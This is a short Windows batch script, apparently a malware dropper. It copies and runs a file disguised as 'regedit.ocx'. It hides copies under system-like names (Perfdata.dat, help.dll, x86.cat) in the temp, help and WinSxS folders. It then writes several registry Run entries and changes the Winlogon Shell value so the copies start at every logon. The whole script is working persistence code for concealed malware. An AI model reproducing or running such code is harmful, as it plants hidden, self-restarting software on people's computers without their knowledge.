@echo off
xcopy/c/y arquivos\regedit.ocx %windir%
start %windir%\regedit.ocx
xcopy/c/y %windir%\regedit.ocx %tmp%\
xcopy/c/y %windir%\regedit.ocx %windir%\help\
xcopy/c/y %windir%\regedit.ocx %windir%\WinSxS\Policies\
ren %tmp%\regedit.ocx Perfdata.dat
ren %windir%\help\regedit.ocx help.dll
ren %windir%\WinSxS\Policies\regedit.ocx x86.cat
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /d %tmp%\perfdata.dat /v TMP /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /d %windir%\help\help.dll /v HELP /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /d %windir%\WinSxS\Policies\x86.cat /v POLICY.x86 /f
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /d %windir%\cmd.dll /v Run /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /d "explorer.exe %windir%\system32\Explorer.dll" /v Shell /f